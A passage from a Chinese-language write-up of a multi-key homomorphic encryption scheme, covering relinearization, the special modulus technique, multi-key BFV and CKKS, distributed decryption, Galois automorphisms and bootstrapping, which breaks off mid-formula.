inline">\(k_{i,j,0}[\iota]=&lt;g^{-1}(b_{j}[\iota]),d_{i,0}&gt;,k_{i,j,1}[\iota]=&lt;g^{-1}(b_{j}[\iota]),d_{i,1}&gt;,1\leqslant{\iota}\leqslant{d}\)</span>，即，<span class="math inline">\([k_{i,j,0}|k_{i,j,1}]=M_{j}·[d_{i,0}|d_{i,1}]\)</span>，其中<span class="math inline">\(M_{j}∈R^{d×d}\)</span>是第<span class="math inline">\(\iota\)</span>行为<span class="math inline">\(g^{-1}(b_{j}[\iota])∈R^{d}\)</span>的矩阵。设<span class="math inline">\(k_{i,j,2}=d_{i,2}\)</span>，返回密文<span class="math inline">\(K_{i,j}=[k_{i,j,0}|k_{i,j,1}|k_{i,j,2}]∈R_{q}^{d×3}\)</span>。 <img src="http://tva1.sinaimg.cn/large/007aD2tWly1gyeecubj7uj30o105stai.jpg" /></p></li><li><p><span class="math inline">\(Relin(\overline{ct};\{D_{i},b_{i}\}_{1\leqslant{i}\leqslant{k}})\)</span>：给定扩展密文<span class="math inline">\(\overline{ct}=(c_{i,j})_{0\leqslant{i,j}\leqslant{k}}\)</span>和k对评估/公共密钥<span class="math inline">\(\{(D_{i},b_{i})\}_{1\leqslant{i}\leqslant{k}}\)</span>，生成密文<span class="math inline">\(\overline{ct}&#39;∈R_{q}^{k+1}\)</span>如下：<br></p></li></ul><p> 1. 对<span class="math inline">\(1\leqslant{i,j}\leqslant{k}\)</span>，计算<span class="math inline">\(K_{i,j}←Convert(D_{i},b_{j})\)</span>，设置重新线性化密钥为<span class="math inline">\(\overline{rlk}=\{K_{i,j}\}_{1\leqslant{i,j}\leqslant{k}}\)</span><br></p><p> 2. 运行算法Algorithm1来重新线性化<span class="math inline">\(\overline{ct}\)</span> <img src="http://tva1.sinaimg.cn/large/007aD2tWly1gyeeo7fhr6j30o10cmaf1.jpg" /></p><p>  我们注意到，第一步(<span class="math inline">\(\overline{rlk}\)</span>的生成)可以在公共信息<span class="math inline">\(\{D_{i},b_{i}\}_{1\leqslant{i}\leqslant{k}}\)</span>上预先计算，而无需将密文作为输入。<br></p><p>  正确性。我们首先声明，如果<span class="math inline">\(D_{i}\)</span>是由第i方加密的<span class="math inline">\(µ_{i}∈R\)</span>的单加密，<span class="math inline">\(b_{j}\)</span>是第j方的公钥，那么Convert算法的输出<span class="math inline">\(K_{i,j}←Convert(D_{i},b_{j})\)</span>是关于<span class="math inline">\((1,s_{i},s_{j})\)</span>的<span class="math inline">\(µ_{i}s_{j}\)</span>的加密，即<span class="math inline">\(k_{i,j,0}+s_{i}·k_{i,j,1}+s_{j}·k_{i,j,2}≈µ_{i}s_{j}·\mathrm{g}\ (mod\ q)\)</span>，由以下公式推导而来：<br></p><p><img src="http://tva1.sinaimg.cn/large/007aD2tWly1gyegp42f5ej30o102o76a.jpg" /></p><p>  请注意，<span class="math inline">\(M_{j},s_{j}\)</span>和<span class="math inline">\(r_{i}\)</span>都应该较小，以保持近似相等。我们在附录C中估算了噪声的大小。<br></p><p>  现在我们展示算法的正确性。因为第i方的评估密钥<span class="math inline">\(D_{i}\)</span>是<span class="math inline">\(µ_{i}=s_{i}\)</span>的单加密，我们得到<span class="math inline">\(K_{i,j}·(1,s_{i},s_{j})≈s_{i}s{j}·\mathrm{g}\ (mod\ q)\)</span>。从<span class="math inline">\(\overline{ct}&#39;\)</span>的定义，我们得到：<br></p><p><img src="http://tva1.sinaimg.cn/large/007aD2tWly1gyegsnbyswj30o109an09.jpg" /></p><h3 id="第二种方法">3.3.2 第二种方法</h3><p>  我们的第二个解决方案不会生成共享重新线性化密钥。相反，它通过递归的方式将扩展密文<span class="math inline">\(\overline{ct}=(c_{i,j})_{0\leqslant{i,j}\leqslant{k}}\)</span>的每一项<span class="math inline">\(c_{i,j}\)</span>乘以<span class="math inline">\(b_{j}\)</span>和<span class="math inline">\(D_{i}\)</span>来直接线性化。<br></p><ul><li><span class="math inline">\(Relin(\overline{ct};\{(D_{i},b_{i})\}_{1\leqslant{i}\leqslant{k}})\)</span>：对于给定的扩展密文<span class="math inline">\(\overline{ct}=(c_{i,j})_{0\leqslant{i,j}\leqslant{k}}\)</span>和k对评估/公共密钥，按照Algorithm 2中的描述生成密文<span class="math inline">\(\overline{ct}&#39;∈R_{q}^{k+1}\)</span></li></ul><p><img src="http://tva1.sinaimg.cn/large/007aD2tWly1gyegyd50iij30o10ex0zj.jpg" /></p><p>  在下一节中，我们将分析和比较两种重新线性化方法。简言之，第二种方法在存储和噪声增长方面具有优势，而如果重复使用共享评估密钥来重新线性化对应于同一组参与方的多个密文，则第一种方法可能更快。我们首先来证明第二种方法的正确性。<br></p><p>  正确性。在Algorithm 2的第二个for循环的每次迭代中，我们计算<span class="math inline">\(c_{i,j}&#39;=&lt;\mathrm{g}^{-1}(c_{i,j}),b_{j}&gt;\)</span>，然后分别将<span class="math inline">\(\mathrm{g}^{-1}(c_{i,j}&#39;)·[d_{i,0}|d_{i,1}]\)</span>和<span class="math inline">\(&lt;\mathrm{g}^{-1}(c_{i,j}),d_{i,2}&gt;\)</span>添加到<span class="math inline">\((c_{0}&#39;,c_{1}&#39;)\)</span>和<span class="math inline">\(c_{j}&#39;\)</span>。我们注意到：<br></p><p><img src="http://tva1.sinaimg.cn/large/007aD2tWly1gyeh6mj92wj30fs01i0ta.jpg" /> <img src="http://tva1.sinaimg.cn/large/007aD2tWly1gyeh6srx3oj30is02kmy8.jpg" /></p><p>  根据<span class="math inline">\(\overline{ct}&#39;\)</span>的定义，我们可以得到：<br> <img src="http://tva1.sinaimg.cn/large/007aD2tWly1gyeh7g9odlj30o10d3ady.jpg" /></p><h3 id="重新线性化算法的性能">3.3.3 重新线性化算法的性能</h3><p>  假设多密钥计算涉及k个不同的参与方。对于重新线性化扩展密文<span class="math inline">\(\overline{ct}=(c_{i,j})_{0\leqslant{i,j}\leqslant{k}}∈R_{q}^{(k+1)^{2}}\)</span>，我们的两种重新线性化方法都在每一个<span class="math inline">\(c_{i,j}\)</span>上重复一些计算，以将其相应的<span class="math inline">\(s_{i}·s_{j}\)</span>转换为<span class="math inline">\((1,s_{i},s_{j})\)</span>。因此，我们将关注每个解决方案的单个步骤(i,j)，以比较它们的性能。<br></p><p>  在第一种方法中，计算方生成共享重新线性化密钥<span class="math inline">\(K_{i,j}\)</span>，并使用它来线性化输入的扩展密文。<span class="math inline">\(K_{i,j}\)</span>的生成包括d×d和d×2矩阵之间的乘法，因此复杂性为<span class="math inline">\(2d^{2}\)</span>多项式乘法。而第二种方法没有任何预处理，Algorithm 2的一次迭代需要4d多项式乘法。因此，当使用预先计算的共享重新线性化密钥来对同一组（或其子集）参与方执行同态运算时，第一种方法的速度可以达到第二种的4/3倍。然而，与第二种方法的线性存储相比，第一种方法所需的存储空间在k上二次增长。<br></p><p>  第二种方法在噪声管理方面也有优势，我们将在下文与模数提升技术一起讨论。</p><h3 id="特殊模数技术">3.3.4 特殊模数技术</h3><p>  噪音增长是决定参数大小和密码系统整体性能的主要因素。总的来说，我们可以使用一个较大的分解度d来减少Gadget分解后向量<span class="math inline">\(\mathrm{g}^{-1}(·)\)</span>的大小以及密钥切换误差，但是这种方法会导致性能下降。此外，随着d的增加，噪声增长和计算复杂度之间的这种权衡的好处会越来越小。因此，当存在一个小噪音时，这一方法并不是最佳选择。特殊模数（又称模数提升）技术是一种很有吸引力的解决方案，可以用更小的开销来解决这一噪声问题。粗略地说，它将密文模数从q提高到pq，整数p称为特殊模数，然后计算<span class="math inline">\(R_{pq}\)</span>上的密钥切换过程，将模数还原回q。方法的主要优点是，由于模数的减少，密钥切换误差减少了约p个因子。我们将该技术应用到我们的重新线性化和加密算法中。特别地，重新线性化的一个特殊的模数变体需要两个连续的模数切换操作。（细节参见附录A）<br></p><p>  我们回顾一下，对于一个扩展密文<span class="math inline">\(\overline{ct}&#39;∈R_{q}^{k+1}\)</span>，使得对某个（为提高效率而尽量减少）的误差<span class="math inline">\(e_{lin}\)</span>，有<span class="math inline">\(&lt;\overline{ct}&#39;,\overline{sk}&gt;=&lt;\overline{ct},\overline{sk}\otimes\overline{sk}&gt;+e_{lin}\)</span>。请读者参考附录C，其中提供了一个基于多项式系数方差的噪声分析，我们在本节中进行了一个简单总结。<br></p><p>  设u是<span class="math inline">\(R_{q}\)</span>上的一个一致随机变量。我们考虑它的Gadget分解<span class="math inline">\(\mathrm{g}^{-1}(u)\)</span>，并用<span class="math inline">\(V_{\mathrm{g}}\)</span>表示其系数的平均方差。我们分别从第一和第二种方法中估计出重新线性化误差的方差：<span class="math inline">\(V_{1}=k^{2}n^{2}\sigma^{2}·d^{2}V_{g}^{2},V_{2}≈k^{2}n^{2}\sigma^{2}·dV_{g}\)</span>。此外，第二种方法的特殊模数变体使得噪声的方差更小：<span class="math inline">\(V_{2}&#39;=p^{-2}·V_{2}+\frac{1}{24}{(k^{2}+k)n}\)</span>。<br></p><p>  与第一种方案相比，我们的第二种解决方案在实践中具有显著的优势，因为我们可以在得到相同噪音增长水平的同时，使用一个具有较小d的有效分解方法。此外，其模数增长的变体得到一个更小的误差方差，几乎不受分解的大小的影响，因为当我们引入一个特殊的模数p（它可以抵消<span class="math inline">\(V_{2}\)</span>）时，<span class="math inline">\(V_{2}&#39;\)</span>由第二项（舍入误差）所控制。</p><h1 id="两个压缩密文的mkhe方案">4. 两个压缩密文的MKHE方案</h1><p>  在本节中，我们提出了BFV和CKKS方案的多密钥变体。它们共享以下设置和密钥生成阶段，但有不同的消息编码和同态操作算法。<br></p><ul><li><span class="math inline">\(MKHE.Setup(1^{\lambda})\)</span>：运行<span class="math inline">\(Setup(1^{\lambda})\)</span>并返回参数pp<br></li><li><span class="math inline">\(MKHE.KeyGen(pp)\)</span>：每一方i根据<span class="math inline">\((s_{i},b_{i})←KeyGen(pp)\)</span>和<span class="math inline">\(D_{i}←EvkGen(s_{i})\)</span>分别生成私钥、公钥和评估密钥<br></li></ul><p>  我们MKHE方案的加密、解密和同态算法将在下一小节中介绍。在密文之间进行同态运算时，有一个共同的预处理。对于给定密文<span class="math inline">\(\overline{ct}_{i}∈R_{q}^{k_{i}+1}\)</span>，我们用<span class="math inline">\(k\ge{max\{k_{1},k_{2}\}}\)</span>表示<span class="math inline">\(\overline{ct}_{1}\)</span>和<span class="math inline">\(\overline{ct}_{2}\)</span>中参与方的数目。我们重新排列<span class="math inline">\(\overline{ct}_{i}\)</span>的元素，并在空条目中填充零，以生成某些共享相同密钥<span class="math inline">\(\overline{sk}=(1,s_{1},...,s_{k})\)</span>的密文<span class="math inline">\(\overline{ct}_{i}^{*}\)</span>。准确的说，对应于元组<span class="math inline">\((id_{1},...,id_{k})∈{\{1,2,...,k\}}^{k_{i}}\)</span>的密文<span class="math inline">\(\overline{ct}_{i}=(c_{0},c_{1},...,c_{k_{i}})\)</span>被转换为密文<span class="math inline">\(\overline{ct}_{i}^{*}=(c_{0}^{*},c_{1}^{*},...,c_{k}^{*})∈R_{q}^{k+1}\)</span>，其中<span class="math inline">\(c_{0}^{*}=c_{0},c_{i}^{*}=\left\{\begin{aligned}  c_{j}\ \ \ if\ i=id_{j}\ for\ some\ 1\le{j}\le{k}\\  0\ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ otherwise \end{aligned}\right.\)</span>。我们注意到，<span class="math inline">\(&lt;\overline{ct}_{i},(1,s_{id_{1}},...,s_{id_{k_{i}}})&gt;=&lt;\overline{ct}^{*},(1,s_{1},...,s_{k})&gt;\)</span>。为简单起见，我们将假设此预处理总是在同态运算之前完成，以便两个输入密文与k个参与方的同一集合相关。<br></p><p><strong>安全性和正确性</strong>：我们记得，在参数<span class="math inline">\((n,q,\chi,\psi)\)</span>的RLWE假设下，BFV和CKKS是IND-CPA安全的。我们的MKHE方案具有完全相同的单密钥加密算法，因此它们的安全性依赖于同一RLWE问题的难度（细节参见附录B）。本节中我们将简单展示我们方案的正确性，噪音分析的严格证明将在附录C中提供。</p><h2 id="多密钥bfv">4.1 多密钥BFV</h2><p>  BFV方案是一种大小不变的HE，它支持在具有有限特征的离散空间上进行精确计算。我们用t来表示明文模数，<span class="math inline">\(\Delta=\lfloor{q/t}\rceil\)</span>表示BFV方案的比例因子。原始明文空间是分圆多项式<span class="math inline">\(R_{t}\)</span>的集合，但是，根据t和n的关系，明文通过<span class="math inline">\(R_{t}\)</span>的环同构被解码为有限域元素的元组。<br></p><ul><li><span class="math inline">\(MK-BFV.Enc(m;b,\mathrm{a})\)</span>：这是标准的BFV加密，以多项式<span class="math inline">\(m∈R_{t}\)</span>为输入。设<span class="math inline">\(a=\mathrm{a}[0],b=b[0]\)</span>。采样<span class="math inline">\(v\gets\chi\)</span>和<span class="math inline">\(e_{0},e_{1}\gets\psi\)</span>。返回密文<span class="math inline">\(ct=(c_{0},c_{1})∈R_{q}^{2}\)</span>，其中<span class="math inline">\(c_{0}=v·b+\Delta·m+e_{0}\ (mod\ q),c_{1}=v·a+e_{1}\ (mod\ q)\)</span>.</li><li><span class="math inline">\(MK-BFV.Dec(\overline{ct};s_{1},...,s_{k})\)</span>：设<span class="math inline">\(\overline{ct}=(c_{0},c_{1},...,c_{k})\in{R_{q}^{k+1}}\)</span>是与k方相关联的密文，<span class="math inline">\(s_{1},...,s_{k}\)</span>是他们的私钥。设置<span class="math inline">\(\overline{sk}=(1,s_{1},...,s_{k})\)</span>并计算<span class="math inline">\(\lfloor{(t/q)·&lt;\overline{ct},\overline{sk}&gt;}\rceil\ (mod\ t)\)</span>.</li><li><span class="math inline">\(MK-BFV.Add(\overline{ct}_{1},\overline{ct}_{2})\)</span>：给定两个密文<span class="math inline">\(\overline{ct}_{i}\in{R_{q}^{k+1}}\)</span>，返回密文<span class="math inline">\(\overline{ct}&#39;=\overline{ct}_{1}+\overline{ct}_{2}\ (mod\ q)\)</span>.</li><li><span class="math inline">\(MK-BFV.Mult(\overline{ct}_{1},\overline{ct}_{2};{\{(D_{i},b_{i})\}}_{1\le{i}\le{k}})\)</span>：给定两个密文<span class="math inline">\(\overline{ct}_{i}\in{R_{q}^{k+1}}\)</span>，计算<span class="math inline">\(\overline{ct}=\lfloor{(t/q)·(\overline{ct}_{1}\otimes\overline{ct}_{2})\rceil\ (mod\ q)\in{R_{q}^{(k+1)^{2}}}}\)</span>，返回密文<span class="math inline">\(\overline{ct}&#39;\gets{Relin(\overline{ct};\{(D_{i},b_{i})\}_{1&lt;i&lt;k})}\)</span>.<br></li></ul><p>  我们方案的正确性是从基本BFV和重新线性化算法的性质得到的。<span class="math inline">\(m\in{R_{t}}\)</span>的一个多密钥BFV加密是一个向量<span class="math inline">\(\overline{ct}=(c_{0},c_{1},...,c_{k})\in{R_{q}^{k+1}}\)</span>，从而对于私钥<span class="math inline">\(\overline{sk}=(1,s_{1},...,s_{k})\)</span>有<span class="math inline">\(&lt;\overline{ct},\overline{sk}&gt;\approx\Delta·m\ (mod\ q)\)</span>。因此解密算法能够正确回复m。如果<span class="math inline">\(\overline{ct}_{1}\)</span>和<span class="math inline">\(\overline{ct}_{2}\)</span>是<span class="math inline">\(m_{1}\)</span>和<span class="math inline">\(m_{2}\)</span>关于私钥<span class="math inline">\(\overline{sk}=(1,s_{1},...,s_{k})\)</span>的加密，则它们的（标度）张量积<span class="math inline">\(\overline{ct}=\lfloor{(t/q)·(\overline{ct}_{1}\otimes\overline{ct}_{2})\rceil\ (mod\ q)}\)</span>满足<span class="math inline">\(&lt;\overline{ct},\overline{sk}\otimes\overline{sk}&gt;\approx\Delta·m_{1}m_{2}\ (mod\ q)\)</span>，与原始BFV方案类似。输出<span class="math inline">\(\overline{ct}&#39;\gets{Relin(\overline{ct};\overline{rlk})}\)</span>有<span class="math inline">\(&lt;\overline{ct}&#39;,\overline{sk}&gt;\approx&lt;\overline{ct},\overline{sk}\otimes\overline{sk}&gt;\approx\Delta·m_{1}m_{2}\ (mod\ q)\)</span>。</p><h2 id="多密钥ckks">4.2 多密钥CKKS</h2><p>  CKKS方案是一种支持近似不动点算法的分层HE方案。我们假设对于某些整数<span class="math inline">\(p_{i}\)</span>有<span class="math inline">\(\prod_{i=0}^{L}{p_{i}}\)</span>，存在一个密文模链<span class="math inline">\(q_{0}&lt;q_{1}&lt;...&lt;q_{L},q_{\iota}=\prod_{i=0}^{\iota}{p_{i}}\)</span>。原始明文是一个小多项式<span class="math inline">\(m\in{R}\)</span>，但通过DFT，一个多项式最多可以包含(n/2)个复数。除了基本的算数运算之外，它还支持重缩放算法来控制加密信息的大小。对于不同层次间密文的同态运算，它需要将一个高层次的密文转换为与另一个密文相同的层次。<br></p><ul><li><span class="math inline">\(MK-CKKS.Enc(m;b,a)\)</span>：设<span class="math inline">\(m∈R\)</span>是一个输入明文，<span class="math inline">\(a=\mathrm{a}[0],b=b[0]\)</span>。采样<span class="math inline">\(v\gets\chi\)</span>和<span class="math inline">\(e_{0},e_{1}\gets\psi\)</span>。返回密文<span class="math inline">\(ct=(c_{0},c_{1})∈R_{q}^{2}\)</span>，其中<span class="math inline">\(c_{0}=v·b+m+e_{0}\ (mod\ q),c_{1}=v·a+e_{1}\ (mod\ q)\)</span>.</li><li><span class="math inline">\(MK-CKKS.Dec(\overline{ct};s_{1},...,s_{k})\)</span>：设<span class="math inline">\(\overline{ct}=(c_{0},c_{1},...,c_{k})\in{R_{q_{\iota}}^{k+1}}\)</span>是层次为<span class="math inline">\(\iota\)</span>的与k方相关联的密文，<span class="math inline">\(s_{1},...,s_{k}\)</span>是它们的私钥。设置<span class="math inline">\(\overline{sk}=(1,s_{1},...,s_{k})\)</span>并返回<span class="math inline">\(&lt;\overline{ct},\overline{sk}&gt;\ (mod\ q_{\iota})\)</span>.</li><li><span class="math inline">\(MK-CKKS.Add(\overline{ct}_{1},\overline{ct}_{2})\)</span>：给定两个<span class="math inline">\(\iota\)</span>层的密文<span class="math inline">\(\overline{ct}_{i}\in{R_{q}^{k+1}}\)</span>，返回密文<span class="math inline">\(\overline{ct}&#39;=\overline{ct}_{1}+\overline{ct}_{2}\ (mod\ q_{\iota})\)</span>.</li><li><span class="math inline">\(MK-CKKS.Mult(\overline{ct}_{1},\overline{ct}_{2};{\{(D_{i},b_{i})\}}_{1\le{i}\le{k}})\)</span>：给定两个<span class="math inline">\(\iota\)</span>层的密文<span class="math inline">\(\overline{ct}_{i}\in{R_{q}^{k+1}}\)</span>，计算<span class="math inline">\(c_{i}&#39;=\lfloor{p_{\iota}^{-1}·c_{i}\rceil,0\le{i}\le{k},}\)</span>并返回密文<span class="math inline">\(\overline{ct}&#39;=(c_{0}&#39;,c_{1}&#39;,...,c_{k}&#39;)\in{R_{q_{\iota-1}}^{k+1}}\)</span>.</li></ul><p>  明文m的一个与私钥<span class="math inline">\(\overline{sk}=(1,s_{1},...,s_{k})\)</span>相关联的<span class="math inline">\(\iota\)</span>层多密钥加密是一个向量<span class="math inline">\(\overline{ct}=(c_{0},c_{1},...,c_{k})\in{R_{q_{\iota}}^{k+1}}\)</span>，满足<span class="math inline">\(&lt;\overline{ct},\overline{sk}&gt;\approx{m}\ (mod\ q_{\iota})\)</span>。对于基础同态操作，我们以<span class="math inline">\(m_{1}\)</span>和<span class="math inline">\(m_{2}\)</span>的<span class="math inline">\(\iota\)</span>层加密作为输入。然后同态加法（乘法）返回一个密文<span class="math inline">\(\overline{ct}&#39;\)</span>，使得<span class="math inline">\([&lt;\overline{ct}&#39;,\overline{sk}&gt;]_{q_{\iota}}\)</span>与<span class="math inline">\(m_{1}+m_{2}\ (m_{1}m_{2})\)</span>近似相等。最后，我们展示了对于m的一个<span class="math inline">\(\iota\)</span>层加密<span class="math inline">\(\overline{ct}\)</span>，重缩放算法从公式<span class="math inline">\([&lt;\overline{ct}&#39;,\overline{sk}&gt;]_{q_{\iota-1}}\approx{p_{\iota}^{-1}}·[&lt;\overline{ct},\overline{sk}&gt;]_{q_{\iota}}\)</span>中返回加密了<span class="math inline">\(p_{\iota}^{-1}·m\)</span>的一个<span class="math inline">\((\iota-1)\)</span>层密文<span class="math inline">\(\overline{ct}&#39;\)</span>。</p><h2 id="分布式解密">4.3 分布式解密</h2><p>  在MKHE原本的经典定义中，解密多密钥密文需要涉及所有参与方的密钥。但是实际上，假设有一方持有多个私钥是不合理的。相反，我们可以考虑多个密钥持有者之间的协议来共同解密一个密文。我们方案的解密算法是已知系数的私钥的（近似）线性组合，且已经提出了一些用于此任务的安全方法。我们介绍了一种基于噪声淹没技术的简单解决方案，但可以使用任意实现相同功能的安全解决方案。<br></p><p>  分布式解密由两个算法组成：部分解密和合并。在第一部分，每一方i接收密文的第i个条目，并带有噪音进行解密。我们设置了比基本方案的标准误差分布<span class="math inline">\(\psi\)</span>方差更大的噪声分布<span class="math inline">\(\phi\)</span>。然后我们将部分解密的结果与<span class="math inline">\(c_{0}\)</span>合并以恢复信息。</p><ul><li><span class="math inline">\(MKHE.PartDec(c_{i},s_{i})\)</span>：给定一个多项式<span class="math inline">\(c_{i}\)</span>和一个秘密<span class="math inline">\(s_{i}\)</span>，采样误差<span class="math inline">\(e_{i}\gets{\phi}\)</span>并返回<span class="math inline">\(\mu_{i}=c_{i}·s_{i}+e_{i}\ (mod\ q)\)</span>.</li><li><span class="math inline">\(MK-BFV.Merge(c_{0},\{\mu_{i}\}_{1\le{i}\le{k}})\)</span>：计算<span class="math inline">\(\mu=c_{0}+\sum_{i=1}^{k}{\mu_{i}}\ (mod\ q)\)</span>并返回<span class="math inline">\(m=\lfloor{(t/q)·\mu\rceil}\)</span>.</li><li><span class="math inline">\(MK-CKKS.Merge(c_{0},\{\mu_{i}\}_{1\le{i}\le{k}})\)</span>：计算并返回<span class="math inline">\(\mu=c_{0}+\sum_{i=1}^{k}{\mu_{i}}\ (mod\ q)\)</span>.</li></ul><p>  对于一个多密钥密文<span class="math inline">\(\overline{ct}=(c_{0},...,c_{k})\)</span>，多密钥BFV和CKKS方案都在合并阶段计算<span class="math inline">\(\mu=c_{0}+\sum_{i=1}^{k}{\mu_{i}}=&lt;\overline{ct},\overline{sk}&gt;+\sum_{i=1}^{k}{e_{i}}\approx&lt;\overline{ct},\overline{sk}&gt;\ (mod\ q)\)</span>。然后，BFV通过取消比例因子(q/t)来提取明文。</p><h1 id="两个mkhe方案的自举性">5. 两个MKHE方案的自举性</h1><p>  已经存在一些关于基于标准（单密钥）环的HE方案自举过程的研究。以前的工作有不同的基于基础方案的目标和解决方案，但它们基本上遵循Gentry的技术-解密电路的同态评估。特别地，BFV和CKKS方案具有非常相似的自举途径，由以下四步组成：（1）模数提升；（2）多项式系数到时隙；（3）提取和（4）时隙到多项式系数。第二步和最后一步是特定的线性变换，这需要对加密的向量进行旋转操作。<br></p><p>  在本节的其余部分，我们首先解释了如何基于Galois自同构的计算来对多密钥密文进行旋转操作。然后我们重新讨论了BFV和CKKS的自举过程，以推广MKHE方案的现有解决方案。</p><h2 id="galois自同构的同态计算">5.1 Galois自同构的同态计算</h2><p>  分圆域的Galois群<span class="math inline">\(Gal(\mathbb{Q}[X]/(X^{n}+1))\)</span>由<span class="math inline">\(X\mapsto{X^{j}},j\in{\mathbb{Z}_{2n}^{*}}\)</span>的转换组成。我们记得BFV（CKKS）使用<span class="math inline">\(R_{t}(R)\)</span>上的DFT来将多个明文值压缩到单个多项式中。这些自同构为压缩密文提供了特殊的功能，例如明文时隙的旋转。<br></p><p>  自同构的评估可以基于密钥切换技术来完成。设<span class="math inline">\(\tau_{j}:a(X)\mapsto{a(X^{j})}\)</span>是Galois群的一个元素。给定m的一个加密<span class="math inline">\(\overline{ct}=(c_{0},c_{1},...,c_{k})\in{R_{q}^{k+1}}\)</span>，我们用<span class="math inline">\(\tau_{j}(\overline{ct})=(\tau_{j}(c_{0}),...,\tau_{j}(c_{k}))\)</span>表示通过将<span class="math inline">\(\tau_{j}\)</span>取为<span class="math inline">\(\overline{ct}\)</span>条目而得到的密文。<span class="math inline">\(\tau_{j}(\overline{ct})\)</span>是<span class="math inline">\(\tau_{j}(m)\)</span>对应于私钥<span class="math inline">\(\tau_{j}(\overline{sk})\)</span>的一个有效加密。然后我们执行从<span class="math inline">\(\tau_{j}(\overline{sk})\)</span>到<span class="math inline">\(\overline{sk}\)</span>的密钥切换程序，从而生成一个新密文，在原始私钥<span class="math inline">\(\overline{sk}\)</span>下对同一信息进行加密。 接下来，我们提出了两种Galois元素的评估算法。第一个算法为Galois自同构<span class="math inline">\(\tau_{j}\)</span>生成一个评估密钥。第二个算法收集多方的评估密钥，并使用多密钥切换技术对多密钥密文上的<span class="math inline">\(\tau_{j}\)</span>进行评估。<br></p><ul><li><span class="math inline">\(MKHE.GkGen(j;s)\)</span>：生成一个随机向量<span class="math inline">\(h_{1}\gets{U(R_{q}^{d})}\)</span>和一个误差向量<span class="math inline">\(e&#39;\gets{\psi^{d}}\)</span>。对于一个RLWE秘密<span class="math inline">\(s\in{R}\)</span>，计算<span class="math inline">\(h_{0}=-s·h_{1}+e&#39;+\tau_{j}(s)·g\ (mod\ q)\)</span>。返回Galois评估密钥<span class="math inline">\(gk=[h_{0}|h_{1}]\in{R_{q}^{d×2}}\)</span>.</li><li><span class="math inline">\(MKHE.EvalGal(\overline{ct};\{gk_{i}\}_{1\le{i}\le{k}})\)</span>：设<span class="math inline">\(gk_{i}=[h_{i,0}|h_{i,1}]\)</span>是第i方（1≤i≤k）的Galois评估密钥。给定密文<span class="math inline">\(\overline{ct}=(c_{0},...,c_{k})\in{R_{q}^{k+1}}\)</span>，计算并返回密文<span class="math inline">\(\overline{ct}&#39;=(c_{0}&#39;,...,c_{k}&#39;)\)</span>，其中<span class="math inline">\(1≤i≤k,c_{0}&#39;=\tau_{j}(c_{0})+\sum_{i=1}^{k}{&lt;g^{-1}(\tau_{j}(c_{j})),h_{i,0}&gt;}\ (mod\ q),c_{i}&#39;=&lt;g^{-1}(\tau_{j}(c_{i})),h_{i,1}&gt;\ (mod\ q)\)</span></li></ul><p>  在CKKS的上下文中，所有<span class="math inline">\(\iota\)</span>层密文的计算都是在模数<span class="math inline">\(q=q_{\iota}\)</span>上进行的。现在我们展示我们算法的正确性。<br></p><p><strong>正确性</strong>：根据定义，输出密文<span class="math inline">\(\overline{ct}&#39;=(c_{0}&#39;,...,c_{k}&#39;)\gets{MKHE.EvalGal(\overline{ct};\{gk_{i}\}_{1\le{i}\le{k}})}\)</span>，有</p><p><img src="http://tva1.sinaimg.cn/large/007aD2tWly1gyfnwz8dzbj30le09ttbx.jpg" /> 换句话说，如果输入密文具有相位<span class="math inline">\(\mu(X)=&lt;\overline{ct},\overline{sk}&gt;\ (mod\ q)\)</span>，则输出密文的相位大约等同于<span class="math inline">\(\tau_{j}(\mu(X))=\mu(X^{j})\)</span>。<br></p><p>  除了明文时隙的旋转，我们使用相同的技术评估BFV密文上的Frobenius自同态<span class="math inline">\(X\mapsto{X}^{t}\)</span>。在CKKS中，映射<span class="math inline">\(X\mapsto{X}^{t}\)</span>对应于明文时隙上的复数共轭。<br></p><p>  任意线性转换都可以表示为移位明文向量的线性组合。我们注意到之前线性转换的HE优化技术能够直接应用到我们的MKHE方案中。</p><h2 id="多密钥bfv的自举性">5.2 多密钥BFV的自举性</h2><p>  Chen和Han描述了单密钥BFV方案的一个自举过程。该自举方案以具有任意噪音的密文作为输入，并输出另一个加密了相同明文的具有较小噪音的密文。下面我们介绍一个多密钥变体。<br></p><p>  （1）先前的工作公布了一个私钥本身的加密来提高模数。但是我们证明了这一步可以通过在没有额外信息的情况下乘以一个常数来完成。假设输入密文<span class="math inline">\(\overline{ct}\)</span>加密了一个明文模数为t的信息m，即<span class="math inline">\(&lt;\overline{ct},\overline{sk}&gt;=\frac{q}{t}m+e\ (mod\ q)\)</span> ，e为某个误差。我们将模数转换为q的一个除数q'， 从而有<span class="math inline">\(&lt;\overline{ct}&#39;,\overline{sk}&gt;=\frac{q&#39;}{t}m+e&#39;\ (mod\ q)\)</span>，然后将密文与q/q’相乘，得到密文<span class="math inline">\(\overline{ct}&#39;&#39;\)</span>，其相位为<span class="math inline">\(&lt;\overline{ct}&#39;&#39;,\overline{sk}&gt;=\frac{q}{q&#39;}·(\frac{q&#39;}{t}m+e&#39;)\ (mod\ q)\)</span>。这是一个简单（无噪音）的<span class="math inline">\(\mu=\frac{q&#39;}{t}m+e&#39;\)</span>的加密，明文模数为q'，密文模数为q。<br></p><p>  （2）计算一个同态线性转换，该变换产生多个系数<span class="math inline">\(\mu_{i}\in\mathbb{Z}_{t}\)</span>在它们的明文时隙中的密文。我们主要到这一步可以通过加法、标量乘法和多密钥旋转来实现。<br></p><p>  （3）我们同态地评估上一步得到的多密钥密文上的一个多项式，称之为低位数字去除。它去除了噪音e'并保留了明文时隙中m的系数。<br></p><p>  （4）最后一步是另一个线性转换，它将第二步反转并输出m的一个加密。<br></p><p>  因此，对于小于初始噪音e的误差，输出密文具有相位<span class="math inline">\(\frac{q}{t}m+e&#39;&#39;\ (mod\ q)\)</span>。</p><h2 id="多密钥ckks的自举性">5.3 多密钥CKKS的自举性</h2><p>  Cheon等人提出了单密钥CKKS方案的一个自举过程。CKKS的该自举过程目的是刷新一个低层次密文，并返回在较大的密文模数中（几乎）相同信息的一个加密。如下我们描述了它的多密钥版本。<br></p><p>  （1）第一步以一个最低层次的密文<span class="math inline">\(\overline{ct}\)</span>作为输入。设<span class="math inline">\(\mu=&lt;\overline{ct},\overline{sk}&gt;\ (mod\ q_{0})\)</span>。则对于一个小的I∈R，有<span class="math inline">\(&lt;\overline{ct},\overline{sk}&gt;=q_{0}·I+\mu\)</span>，因此可认为<span class="math inline">\(\overline{ct}\)</span>是最大密文模数<span class="math inline">\(q_{\iota}\)</span>中<span class="math 